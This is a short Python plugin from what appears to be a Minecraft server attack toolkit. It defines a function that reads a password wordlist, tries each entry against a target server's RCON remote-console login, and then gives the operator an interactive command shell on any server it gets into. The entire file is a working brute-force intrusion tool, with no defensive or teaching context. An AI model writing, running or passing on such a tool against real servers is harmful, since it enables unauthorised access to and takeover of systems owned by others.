from mcrcon import MCRcon
from plugins.common import *

def rconbrut(server, file):
    # validate server
    if checkserver(server) == False: logging.error('Please input a real domain or server'); return

    try:
        # read passwords from file
        with open(file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]

        # attempt each password
        for password in passwords:
            try:
                with MCRcon(server, password) as mcr:
                    logging.success(f'Found Password! {password}')
                    logging.info('Type "exit" to exit the rcon client')

                    # command loop
                    while True:
                        rcmd = input(f'{yellow}/')
                        if rcmd == 'exit': mcr.disconnect(); return
                        resp = mcr.command(f"{rcmd}")
                        print(resp)

            except Exception:
                continue

        logging.error('Could not find a valid RCON password.')

    except Exception as e:
        logging.error(str(e))
